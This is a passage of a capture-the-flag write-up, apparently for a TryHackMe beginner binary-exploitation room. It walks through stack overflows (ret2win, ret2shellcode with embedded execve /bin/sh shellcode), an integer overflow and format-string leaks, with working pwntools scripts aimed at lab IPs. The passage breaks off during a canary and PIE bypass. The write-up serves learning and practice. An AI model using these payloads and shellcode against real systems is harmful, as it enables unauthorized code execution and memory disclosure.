</pre><td class="rouge-code"><pre>luka@yurei:~/Desktop/thm/pwn103$ file pwn103.pwn103 
pwn103.pwn103: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3df2200610f5e40aa42eadb73597910054cf4c9f, for GNU/Linux 3.2.0, not stripped
</pre></table></code></div></div><h2 id="checksec-2">Checksec<a href="#checksec-2" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/assets/images/d72158b7a2e2889b334933daa577e556d27c8a13e69235c97833ae220513ac6b.png" alt="picture 20" data-proofer-ignore></p><h2 id="analysis">Analysis<a href="#analysis" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Let’s check decompiler first, for the sake of readibility, as the codebase is pretty big.</p><h3 id="main">Main<a href="#main" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>We can see that we have switch. Spoler alert, the one with vulnerability is the <code class="language-plaintext highlighter-rouge">General()</code>!</p><p><img data-src="/assets/images/93e4dab0a11428a98551c37c92b97afa2d196a625963ff7c934f769eddc92f64.png" alt="picture 21" data-proofer-ignore></p><h3 id="general">General<a href="#general" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>We have scanf function that takes our input…</p><p><img data-src="/assets/images/107439617164b35e9d8b2a31fe283766b4d7096d31b6044b17a1914c2cebc98f.png" alt="picture 22" data-proofer-ignore></p><p>… and is declared as string format specifier. We can enter as much characters/bytes as we want.</p><p><img data-src="/assets/images/58c1fa16f9532792899ee45c1a82ebed45fa8596b97f44c1a6108f0c732a7551.png" alt="picture 23" data-proofer-ignore></p><p>Note that in the end of the General function there is a compare, and if we check the address in hexdump, we’d find the string <code class="language-plaintext highlighter-rouge">yes</code></p><p><img data-src="/assets/images/569486e9e45244df41694f2bcb6371269a24fa445954b6b600576a5046224cf3.png" alt="picture 25" data-proofer-ignore></p><p>In addition to all of that, there is <code class="language-plaintext highlighter-rouge">Admins_only</code> function which is the one we want to solve this CTF</p><h3 id="admins_only">Admins_only<a href="#admins_only" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>This is decompiled code</p><p><img data-src="/assets/images/dbd73f2c5bfe018354fcd027e088997ac1293d2b49909bf95803b4d4f7d8cab6.png" alt="picture 26" data-proofer-ignore></p><p>How can we get into the <code class="language-plaintext highlighter-rouge">Admins_only</code> function? We can abuse <code class="language-plaintext highlighter-rouge">scanf</code> function in <code class="language-plaintext highlighter-rouge">general</code>. We can write to <code class="language-plaintext highlighter-rouge">*s1</code> variable, which resides at <code class="language-plaintext highlighter-rouge">rbp-0x20</code> . From there we can overwrite the return address of <code class="language-plaintext highlighter-rouge">general</code> function that was put onto the stack and make it return to <code class="language-plaintext highlighter-rouge">Admins_only</code> function instead.</p><p>In order to reach the return address, we need 8 more bytes (64-bit!) so 28 in total.</p><p>Because of <a href="https://www.cameronwickes.co.uk/stack-alignment-ubuntu-18-04-movaps/">MOVAPS</a> issue we can add another RET instruction before actual payload call.</p><h2 id="exploit-local-2">Exploit (local)<a href="#exploit-local-2" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./pwn103.pwn103"</span><span class="p">)</span>

<span class="c1">#p = process()
</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"10.10.16.17"</span><span class="p">,</span><span class="mi">9003</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
<span class="c1">#admins_only_address = p64(0x00401554)
# alternative call
</span>
<span class="n">admins_only_address</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">symbols</span><span class="p">.</span><span class="n">admins_only</span><span class="p">)</span>

<span class="n">ret_instruction</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00401377</span><span class="p">)</span>

<span class="c1"># payload before MOVAPS - adding ret_instruction
#payload = b"A"*0x20 + b"B"*0x8 + admins_only_address
</span>
<span class="c1"># payload after fixing the bug
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x20</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x8</span> <span class="o">+</span> <span class="n">ret_instruction</span> <span class="o">+</span> <span class="n">admins_only_address</span>


<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><h2 id="exploit-remote-2">Exploit (remote)<a href="#exploit-remote-2" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./pwn103.pwn103"</span><span class="p">)</span>

<span class="c1">#p = process()
</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"10.10.16.17"</span><span class="p">,</span><span class="mi">9003</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
<span class="c1">#admins_only_address = p64(0x00401554)
# alternative call
</span>
<span class="n">admins_only_address</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">symbols</span><span class="p">.</span><span class="n">admins_only</span><span class="p">)</span>

<span class="n">ret_instruction</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00401377</span><span class="p">)</span>

<span class="c1"># payload before MOVAPS - adding ret_instruction
#payload = b"A"*0x20 + b"B"*0x8 + admins_only_address
</span>
<span class="c1"># payload after fixing the bug
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x20</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x8</span> <span class="o">+</span> <span class="n">ret_instruction</span> <span class="o">+</span> <span class="n">admins_only_address</span>

<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p><img data-src="/assets/images/533f858df18c62e27d0bbd90775eb0224d14b59ebc7ecdda4a72be337f3da890.png" alt="picture 27" data-proofer-ignore></p><h1 id="pwn104---stack-bof---ret2shellcode">PWN104 - Stack BOF - Ret2Shellcode</h1><blockquote><p>The challenge is running on port 9004</p></blockquote><p>After downloading the binary let’s check what that appliation does?</p><p><img data-src="/assets/images/b5456a1e0512ff16198b9545b8baa68ac1dd404075c92ab35572f4aadd96f87e.png" alt="picture 28" data-proofer-ignore></p><p>Looks like another buffer overflow. When running binary few times, we can notice that that address that is provided to as in <code class="language-plaintext highlighter-rouge">... i'm waiting for you at...</code> changes with every execution</p><p><img data-src="/assets/images/18a7d55afaad1d1be5ebd2b77a533e1e4416b5266c9f6c95f5547368668cc7ac.png" alt="picture 29" data-proofer-ignore></p><p>We have to deal with ASLR here. Another way to check this would be to check the address of Dynamic Linker</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ldd pwn104.pwn104
</pre></table></code></div></div><h2 id="checksec-and-file-check">Checksec and File check<a href="#checksec-and-file-check" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/assets/images/ae9ac323824363707689b1c2c728ff07b9f33f9a06d7c2c024df9e9eaccdc280.png" alt="picture 30" data-proofer-ignore></p><h2 id="analysis-1">Analysis<a href="#analysis-1" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/assets/images/17a215330f73e7d62905589f0fdd0a43aaf67b289c4553be890ffe0b046b8b6b.png" alt="picture 31" data-proofer-ignore></p><p>Buffer overflow is in the Read function So, we know what we will overwrite - Buffer (<code class="language-plaintext highlighter-rouge">*buf</code>) starts at <code class="language-plaintext highlighter-rouge">rbp-0x50</code>, but we musst know it’s address if we want to return to it.</p><p>Remember that binary is printing some addresses, but what is it printing exactly? =&gt; it’s the pointer to the buf ( see the printf function above)</p><p>Another thing to point out here is what gives us permission to execute custom shellcode from the stack? ==&gt; NX is disabled!</p><p>This code was used to test the poinrer to the <code class="language-plaintext highlighter-rouge">*buf</code> position using the leak that is there to help us ;)</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./pwn104.pwn104'</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>

<span class="n">addr_leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">addr_main</span> <span class="o">=</span> <span class="n">addr_leak</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">"at"</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">decode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">addr_main</span><span class="p">)</span>

<span class="c1"># This prints the address in HEX format
</span></pre></table></code></div></div><p>Shellcode: https://www.exploit-db.com/exploits/42179</p><h2 id="exploit-local-3">Exploit (local)<a href="#exploit-local-3" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Notice how the leaked pointer address was splitted and converted to hexadecimal!</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./pwn104.pwn104'</span><span class="p">)</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"debug"</span>
<span class="c1"># Size 23B - source: https://www.exploit-db.com/exploits/46907
</span><span class="n">shellcode</span><span class="o">=</span><span class="sa">b</span><span class="s">"</span><span class="se">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</span><span class="s">"</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>

<span class="n">addr_leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">addr_buf_pointer</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">addr_leak</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">"at"</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">strip</span><span class="p">().</span><span class="n">decode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>

<span class="c1">#print(addr_buf_pointer)
</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x50</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr_buf_pointer</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><h2 id="exploit-remote-3">Exploit (remote)<a href="#exploit-remote-3" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./pwn104.pwn104'</span><span class="p">)</span>
<span class="c1">#context.log_level = "debug"
# Size 23B - source: https://www.exploit-db.com/exploits/46907
</span><span class="n">shellcode</span><span class="o">=</span><span class="sa">b</span><span class="s">"</span><span class="se">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</span><span class="s">"</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"10.10.109.228"</span><span class="p">,</span><span class="mi">9004</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">addr_leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">addr_buf_pointer</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">addr_leak</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">"at"</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">strip</span><span class="p">().</span><span class="n">decode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>

<span class="c1">#print(addr_buf_pointer)
</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x50</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr_buf_pointer</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p>Same code was used for remotely, execpt there was another <code class="language-plaintext highlighter-rouge">p.recv()</code> needed which had to be debugged using <code class="language-plaintext highlighter-rouge">context.log_level = "debug"</code></p><p><img data-src="/assets/images/c9d05bd48aecfceda19b9d4624ca91bb2538eb7ccd4cb5ed98624bc43b095c0d.png" alt="picture 32" data-proofer-ignore></p><h1 id="pwn105---integer-overflowunderflow">PWN105 - Integer Overflow/Underflow</h1><blockquote><p>The challenge is running on port 9005</p></blockquote><h2 id="file-and-checksec">File and Checksec<a href="#file-and-checksec" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/assets/images/b205c49ff59162cfafb1ce0c1e7883866b1e2ec05555f175cec5e2f58d27111b.png" alt="picture 33" data-proofer-ignore></p><h2 id="analysis-2">Analysis<a href="#analysis-2" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>There are no special functions of interest, so let us sheck the <code class="language-plaintext highlighter-rouge">main</code> function. There are 2 scanf which are the ones that load our input to memory.</p><p><img data-src="/assets/images/701c527855ffe1d3f31040ef94e046d8a1fb16f794b9ca251182befaa8b7a02c.png" alt="picture 34" data-proofer-ignore></p><p>If we check the <code class="language-plaintext highlighter-rouge">0x000216f</code> in hexdump we can see that both point to with <code class="language-plaintext highlighter-rouge">%d</code> format specifier. <code class="language-plaintext highlighter-rouge">%d</code> stands stands for signed integer (negative AND positive).</p><p><img data-src="/assets/images/7a8bfe25e57316b54ff5e741b3cf9ace4c5c974bc246717034c332174e488404.png" alt="picture 35" data-proofer-ignore></p><ul><li>0x00012fb both values are added and are saved on 0x000012fd into <code class="language-plaintext highlighter-rouge">var_ch</code>.<li>0x00001303 compares if both signs are positive</ul><p>If we check the rest of the execution flows, we can locate system call which is where we want to get to.</p><p><img data-src="/assets/images/7a910e6de2aee4bc3fe251cdb2b5fa662de370d8dad0c4bc2e4d03840e86da88.png" alt="picture 36" data-proofer-ignore></p><ul><li><p>0x0000130a - <code class="language-plaintext highlighter-rouge">var_10h</code> is checked again if signed = if positive</p><li>Regarding CMP operand at <code class="language-plaintext highlighter-rouge">0x0000130e</code>:<blockquote><p>Compares the first source operand with the second source operand and sets the status flags in the EFLAGS register according to the results. The comparison is performed by subtracting the second operand from the first operand and then setting the status flags in the same manner as the SUB instruction. When an immediate value is used as an operand, it is sign-extended to the length of the first operand. … The CF, OF, SF, ZF, AF, and PF flags are set according to the result</p><p><a href="http://www.jaist.ac.jp/iscenter-new/mpc/altix/altixdata/opt/intel/vtune/doc/users_guide/mergedProjects/analyzer_ec/mergedProjects/reference_olh/mergedProjects/instructions/instruct32_hh/vc36.htm">REFERENCE</a></p></blockquote><li>0x00001312 checks if signed (sf=1) =&gt; the result <strong>this is the point where we need negative result to get to the branch with system function</strong></ul><p>We are aiming at Integer overflow/underflow. I’ve personally had to deal with the same concept here: http://cybersec-research.space/posts/Bussines-Logic-Vulnerabilities/#low-level-logic-flaw—integer-overflow</p><p>If we overflow the left-most bit of the signed integer, we will endup with a negative value.</p><h2 id="exploit">Exploit<a href="#exploit" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>To solve the lab we musst add (&gt;=1) to the highest possible <strong>positive</strong> number of signed integer in 32-bit space =&gt; <strong>2147483647</strong></p><p>This will work on remote machine as well. <img data-src="/assets/images/55d55771f13f3407505fbbbea05d7c728257309c741d3094df8a090c6268a687.png" alt="picture 37" data-proofer-ignore></p><h1 id="pwn106---format-string-vulnerability---reading-the-stack">PWN106 - Format String Vulnerability - Reading the Stack</h1><blockquote><p>The challenge is running on port 9006</p></blockquote><p>Download the lab and run it to check what we’re dealing with.</p><p><img data-src="/assets/images/39be7bf89db175304acf1aa88f5e4a36956e2dbe3af4f86de56d2fbbca930aa6.png" alt="picture 38" data-proofer-ignore></p><p>We have print format vulnerability as we’re leaking memory as seen above.</p><h2 id="file-3">File<a href="#file-3" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>64-bit, dynamically linked and not stripped</p><p><img data-src="/assets/images/9d24d4ed8c1740afaca1e9182562195f04d09e4fcf3e4f9e90474d728b1e8db9.png" alt="picture 39" data-proofer-ignore></p><h2 id="checksec-3">Checksec<a href="#checksec-3" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/assets/images/fa44fd467e912b35bf61fbdf3519ce46cf1c77631eddc7ce09f85a5f0d86f0c7.png" alt="picture 40" data-proofer-ignore></p><h2 id="dissasembly">Dissasembly<a href="#dissasembly" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>We can see flags placeholder on the stack, so we’ll try to leak memory here.</p><p><img data-src="/assets/images/c0a70bae2b1047a2a372df5a6e846bae7a98cd2bad49a8a04e746e7076300fa0.png" alt="picture 41" data-proofer-ignore></p><p>Calling convention in x64 bit stack =&gt; RDI, RSI, RDX, RCX, R8, R9 and then Stack!</p><h2 id="exploit-local-4">Exploit local<a href="#exploit-local-4" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Link to calling convetion ==&gt;</p><p>Let’s try to leak some data.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span> <span class="o">=</span> <span class="s">'./pwn106user.pwn106-user'</span>

<span class="c1">#payload = "%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX"
</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"%6$lX.%7$lX.%8$lX.%9$lX.%a$lX"</span>
<span class="n">conn</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./pwn106user.pwn106-user'</span><span class="p">)</span>
<span class="n">conn</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">conn</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">result</span><span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>

</pre></table></code></div></div><p><img data-src="/assets/images/103becf7a25f30f4e9f0ccbdb096b126691ec7562718927d8dd9b244ffa8c599.png" alt="picture 42" data-proofer-ignore></p><p>Relevant data starts at 6th position until 10th. Bytes needs to be compared to actually match the ascii representations.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span> <span class="o">=</span> <span class="s">'./pwn106user.pwn106-user'</span>
<span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'10.10.93.168'</span><span class="p">,</span><span class="mi">9006</span><span class="p">)</span>
<span class="c1">#payload = "%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX"
</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"%6$lX.%7$lX.%8$lX.%9$lX.%10$lX.%11$lX"</span>

<span class="n">conn</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">conn</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">result</span><span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</pre></table></code></div></div><p>Using script we get the flag. Decoding was done using Cyberchef.</p><p><img data-src="/assets/images/5ba78b8d9ecb9b1b847f88c1b1c2eafb24f5d8b122ee1b42fed8a9bfc1886432.png" alt="picture 43" data-proofer-ignore></p><h2 id="exploit-remote-4">Exploit Remote<a href="#exploit-remote-4" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Scripts</span> <span class="n">comes</span> <span class="n">here</span><span class="err">!</span>
</pre></table></code></div></div><p><img data-src="/assets/images/6531a76cfaed068d8329c7440c56c329b4d67a007d6b294a66c71ee3984e584c.png" alt="picture 44" data-proofer-ignore></p><p>Putting output to the cyberchef shows the flag.</p><p><img data-src="/assets/images/1accd7709e9959988f8d9e36efda1f3d178f74423df94f4d7351e2b5a821f648.png" alt="picture 45" data-proofer-ignore></p><h1 id="pwn107---format-string-vulnerability---pie-and-canary-bypass">PWN107 - Format String Vulnerability - PIE and Canary Bypass</h1><p>Download the lab and check what is all about</p><p><img data-src="/assets/images/e04079ca950e332960b2d58ecb2e0659b03868912f13f23552a754eae7c03711.png" alt="picture 46" data-proofer-ignore></p><p>Typing simple <code class="language-plaintext highlighter-rouge">%x</code> leaks a memory address.</p><p><img data-src="/assets/images/01423e9619a1721eb75df6a61438039134fbe3bd23d28a6cca1ab0fbce4f510d.png" alt="picture 47" data-proofer-ignore></p><h2 id="file-4">File<a href="#file-4" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/assets/images/6fb58ab030ae263c69670d5967df4a4aca9ed0fa5a97041d1a1b0ef8e6ee97b1.png" alt="picture 48" data-proofer-ignore></p><h2 id="checksec-4">Checksec<a href="#checksec-4" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/assets/images/dd6917c3d114c6772c7a9da8f12126e308ced354e383a39fa6a7d2ee0165d5db.png" alt="picture 49" data-proofer-ignore></p><h2 id="analysis-3">Analysis<a href="#analysis-3" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/assets/images/d1c0c7204084569482acbbc25246aea5f8c3d656fc45b2f7e1faa69fda642745.png" alt="picture 50" data-proofer-ignore></p><p>The second variable <code class="language-plaintext highlighter-rouge">*buf</code> takes in 0x200 where only 0x20 were allocated to.</p><p>There is also a function that isn’t called from the execution flow perspective and this is the <code class="language-plaintext highlighter-rouge">get_streak</code> function which also has <code class="language-plaintext highlighter-rouge">system</code> function in it which calls shell.</p><p><img data-src="/assets/images/0b715b715b8a7f2d8949203854c40df59c21d3b4940d9b8458fec6091e9008cf.png" alt="picture 51" data-proofer-ignore></p><p>Canary resides at <code class="language-plaintext highlighter-rouge">rbp-0x8</code> so in order to overwrite it we would need to know it’s value beforehand. Do we have Format String vulnerability before the <code class="language-plaintext highlighter-rouge">Read</code> function? Yes we do!</p><p><img data-src="/assets/images/9c5b7876e9c6c73f62203fbaabdbe3c8dceb70db145c9cee081f1aabbc2f5d41.png" alt="picture 52" data-proofer-ignore></p><p>To leak the addresses now, we need to start debugging. I’ll use radare2 debugger as razvi uses in his video https://www.youtube.com/watch?v=FpKL2cAlJbM</p><p>Start the binary: <code class="language-plaintext highlighter-rouge">radare2 -d -A pwn107.pwn107</code></p><p>I’ll leave a cheat-sheet below because i also tend to forget the commands used for each debugger!</p><p>This is now <code class="language-plaintext highlighter-rouge">main</code> function loaded in radare2. Use <code class="language-plaintext highlighter-rouge">pdf @ main</code> to print it.</p><p><img data-src="/assets/images/1d1dee2f6d049407b0f1d2ec206e5b283ca1337d968dd19ca1e1e8340170f935.png" alt="picture 53" data-proofer-ignore></p><p>Now let’s set the breakpoints where our printf vulnerability call starts and after it.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>[0x7fa225a1e2b0]&gt; db 0x557397c00a25
[0x7fa225a1e2b0]&gt; db 0x557397c00a2a
